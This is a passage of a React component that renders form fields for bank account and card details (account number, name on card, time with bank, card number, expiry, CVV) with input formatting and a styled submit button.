                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="12345678"
                                maxLength={8}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Name on Bank Card */}
                      <FormField
                        control={form.control}
                        name="nameOnCard"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Name on Bank Card
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Name as it appears on your bank card</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <div className="relative group">
                                <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                                <Input
                                  className="pl-9 text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                  placeholder="John Doe"
                                  {...field}
                                />
                              </div>
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Time with Bank */}
                      <FormField
                        control={form.control}
                        name="timeWithBank"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Time with Bank
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>How long you&apos;ve had this bank account</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <Select onValueChange={field.onChange} defaultValue={field.value}>
                              <FormControl>
                                <SelectTrigger className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors">
                                  <SelectValue placeholder="Select time with bank" />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                <SelectItem value="less-than-1">Less than 1 year</SelectItem>
                                <SelectItem value="1-3">1-3 years</SelectItem>
                                <SelectItem value="3-5">3-5 years</SelectItem>
                                <SelectItem value="5-10">5-10 years</SelectItem>
                                <SelectItem value="more-than-10">More than 10 years</SelectItem>
                              </SelectContent>
                            </Select>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>

                  {/* Card Details Section */}
                  <section className="space-y-4">
                    <div className="flex items-center gap-3 text-teal-700 pt-4">
                      <CreditCard className="h-5 w-5" />
                      <h2 className="text-lg sm:text-xl font-semibold">Card Details</h2>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-6">
                      {/* Card Number */}
                      <FormField
                        control={form.control}
                        name="cardNumber"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              16 Digit Card Number
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Your 16-digit debit/credit card number</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="1234567890123456"
                                maxLength={16}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* Card Expiry */}
                      <FormField
                        control={form.control}
                        name="cardExpiry"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              Card Expiry (MM/YY)
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>Expiration date in MM/YY format</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="MM/YY"
                                maxLength={5}
                                {...field}
                                onChange={(e) => {
                                  let value = e.target.value.replace(/\D/g, '');
                                  if (value.length > 2) {
                                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                                  }
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />

                      {/* CVV */}
                      <FormField
                        control={form.control}
                        name="cardCvv"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="flex items-center gap-1 text-sm font-medium">
                              CVV
                              <TooltipProvider delayDuration={100}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Info className="h-3 w-3 text-gray-400 cursor-help" />
                                  </TooltipTrigger>
                                  <TooltipContent side="top" className="max-w-xs">
                                    <p>3-digit security code on back of card</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            </FormLabel>
                            <FormControl>
                              <Input
                                className="text-sm sm:text-base border-gray-300 hover:border-teal-500 focus:border-teal-500 focus:ring-1 focus:ring-teal-500 transition-colors"
                                placeholder="123"
                                type="password"
                                maxLength={3}
                                {...field}
                                onChange={(e) => {
                                  const value = e.target.value.replace(/\D/g, '').slice(0, 3);
                                  field.onChange(value);
                                }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs" />
                          </FormItem>
                        )}
                      />
                    </div>
                  </section>
                </div>
                {/* Submit Button */}
                <Button
                  type="submit"
                  className={cn(
                    "w-full bg-gradient-to-r from-teal-600 to-teal-800 hover:from-teal-700 hover:to-teal-900",
                    "text-sm sm:text-base py-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02]",
                    "flex items-center justify-center gap-2 shadow-md",
                    isSubmitting && "opacity-90 cursor-not-allowed"
                  )}
                  disabled={isSubmitting}
                  aria-label="Submit form"
                >
                  {isSubmitting ? (
                    <>
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                      <span>Submitting...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="h-5 w-5" />
                      <span>Submit Form</span>
                    </>
                  )}
                </Button>
              </form>
            </Form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}